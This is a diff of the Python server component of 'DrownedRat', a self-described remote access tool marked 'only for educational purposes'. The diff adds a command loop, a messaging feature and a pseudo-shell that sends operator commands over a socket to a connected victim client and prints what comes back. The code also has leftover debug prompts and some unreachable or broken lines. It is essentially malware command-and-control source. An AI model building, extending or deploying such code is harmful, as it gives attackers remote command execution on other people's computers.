@@ -1,5 +1,23 @@
+"""
++-----------------------------------------------------------------------+
+|                               DrownedRat                              |
+|    Author: 27016005                                                   |
+|    Version: 0.1                                                       |
+|    Last update: 26-01-2021 (dd-mm-yyyy)                               |
+|                                                                       |
+|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
++-----------------------------------------------------------------------+
+------- CONFIGURATION ------
+In order to use this tool you need to do some tweaking:
+    1. The Server's IP gets automatically set by taking the address from /etc/hosts (Linux), check if your LAN address exists in this file. I had to put it manually since there was only localhost.
+    2. Select a PORT number, the default value set in the client file is 1234
+    3. Play around with the paths, I've set some default values but you can change them
+------ NOTE ------
+This code was tested and developed on a Linux machine, it may not work on other machines.
+"""
+
 import socket
-# import sys
+import sys
 import os
 import time
 
@@ -19,7 +37,7 @@ class Server:
 
     def startServer(self):
         self.server.bind((self.IP, self.PORT))
-        self.server.listen(1)
+        self.server.listen(2)
 
         self.acceptConnections()
 
@@ -30,35 +48,90 @@ class Server:
         self.client_socket, self.address = self.server.accept()
         print(f"*** Connection from {self.address} has been established! ***")
         self.connections.append(self.client_socket)
-        # print('here')
+        # # print('here')
         self.commands()
-        # print("hello worlds")
-        # self.s
+        # # print("hello worlds")
+
+    def sendMsg(self):
+        command = "msg"
+        print("test")
+        input()
+        self.client_socket.send(command.encode())
+
+        msg = input("[+] Enter message: ")
+        time.sleep(2)
+        self.client_socket.send(msg.encode())
+        print(msg)
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+
+        # print them
+        # # print("goes wrong before here? ")
 
     def commands(self):
 
         while True:
-            # get the command from prompt
-            command = input("Enter the command you wanna execute:")
+         # get the command from prompt
+            command = input("Enter the command you want to execute:")
             # send the command to the client
             print(command)
             # self.client_socket.send(command.encode())
-            if command.lower() == "exit":
+
+            if command == "exit":
                 # if the command is exit, just break out of the loop
                 break
-            # retrieve command results
-             # print("here2")
-            msg = input("[+] Enter message: ")
-            self.client_socket.send(msg.encode())
-            print(msg)
-            results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
-            # print them
-            # print("goes wrong before here? ")
-            print(results)
+
+            elif command == "msg":
+                # retrieve command results
+                print("here2")
+                input()
+                self.sendMsg()
+
+            elif command == "shell":
+                self.cmdctrl()
+            else:
+                print("No Valid Command Received")
+        sys.exit()
         # close connection to the client
         self.client_socket.close()
         # close server connection
         self.close()
+
+        print(results)
+
+    def cmdctrl(self):
+        """ This is not a real interactive shell, you get the output
+        of the command but you can't interact with it """
+
+        print("[!] --back to exit shell")
+        while True:
+            cmd = input(f"[{self.address[0]}]$ ") # can't .lower() here as sent commands may include uppercase characters
+
+            if not cmd:
+                print("[!] Can't send empty command.")
+                continue
+
+            if cmd.lower() == "--back":
+                print("GO BACK")
+                break
+
+            time.sleep(2)
+            command = "shell"
+            self.client_socket.send(command.encode("utf-8"))
+            self.client_socket.send(cmd.encode("utf-8"))
+
+            output = self.client_socket.recv(self.BUFFER_SIZE)
+
+            if not output:
+                print("NO OUTPUT")
+                input()
+                self.connections.remove(self.client_socket)
+                self.client_socket.close()
+                self.server.close()
+                break
+
+            print(output.decode("utf-8"))
+
+
 
 
 def main():
@@ -74,7 +147,7 @@ def main():
 
     HOSTNAME = socket.gethostname()
     IP = socket.gethostbyname(HOSTNAME)
-    PORT = int(input("[+] Listen on port> "))
+    PORT = 1337  # int(input("[+] Listen on port> "))
     BUFFERSIZE = 2048
 
     server = Server(IP, PORT, BUFFERSIZE)
